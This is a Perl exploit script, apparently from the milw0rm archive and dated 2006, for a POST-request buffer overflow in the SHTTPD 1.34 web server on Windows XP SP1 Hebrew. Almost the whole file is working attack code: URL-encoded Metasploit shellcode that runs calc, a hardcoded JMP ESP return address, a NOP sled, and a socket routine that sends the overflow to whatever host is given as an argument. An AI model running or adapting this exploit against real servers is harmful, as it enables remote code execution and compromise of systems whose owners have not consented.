#!/usr/bin/perl -w

#  SHTTPD Buffer Overflow (POST)
#  Tested on SHTTPD 1.34 WinXP SP1 Hebrew
#  http://shttpd.sourceforge.net
#  Codded By SkOd, 05/10/2006
#  ISRAEL
#
#    details:
#    EAX 00000194 , ECX 009EBCA8 , EDX 00BC488C
#    EBX 00000004 , EIP 41414141 , EBP 41414141
#    ESI 00BC4358 , EDI 00BCC3CC ASCII "POST"
#    ESP 009EFC08 ASCII 41,"AA...AAA"


use IO::Socket;

sub fail(){
syswrite STDOUT, "[-]Connect failed.\n";
exit;
}

sub header()
{
print("##################################\n");
print("SHTTPD (POST) Buffer Overflow.\n");
print("[http://shttpd.sourceforge.net]\n");
print("Codded By SkOd, 05/10/2006\n");
print("##################################\n");
}

if (@ARGV < 1)
{
    &header();
    print("Usage: Perl shttpd.pl [host]\n");
    exit;
}

&header();
$host=$ARGV[0];
$port="80";
$host=~ s/(http:\/\/)//eg;

#win32_exec- CMD=calc Size=160 (metasploit.com)
$shell =
"%33%c9%83%e9%de%d9%ee%d9%74%24%f4%5b%81%73%13%52".
"%ca%2b%e0%83%eb%fc%e2%f4%ae%22%6f%e0%52%ca%a0%a5".
"%6e%41%57%e5%2a%cb%c4%6b%1d%d2%a0%bf%72%cb%c0%a9".
"%d9%fe%a0%e1%bc%fb%eb%79%fe%4e%eb%94%55%0b%e1%ed".
"%53%08%c0%14%69%9e%0f%e4%27%2f%a0%bf%76%cb%c0%86".
"%d9%c6%60%6b%0d%d6%2a%0b%d9%d6%a0%e1%b9%43%77%c4".
"%56%09%1a%20%36%41%6b%d0%d7%0a%53%ec%d9%8a%27%6b".
"%22%d6%86%6b%3a%c2%c0%e9%d9%4a%9b%e0%52%ca%a0%88".
"%0d%a2%b3%1e%d8%c4%7c%1f%b5%a9%4a%8c%31%ca%2b%e0";


$esp="%73%C3%2A%4F";                 #[4F2AC373]JMP ESP (kernel32.dll) WinXP SP1(Hebrew)
$buff=("%41"x8).$esp.("%90"x85).$shell;        #Shellcode+NOP=245

print length($buff) . "\n";

$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "$port") || &fail();
    syswrite STDOUT,"[+]Connected.\n";
    print $sock "POST /$buff HTTP/1.1\n";
    print $sock "HOST:$host\n\n";
    syswrite STDOUT,"[+]Done.\n";
close($sock);

# milw0rm.com [2006-10-05]
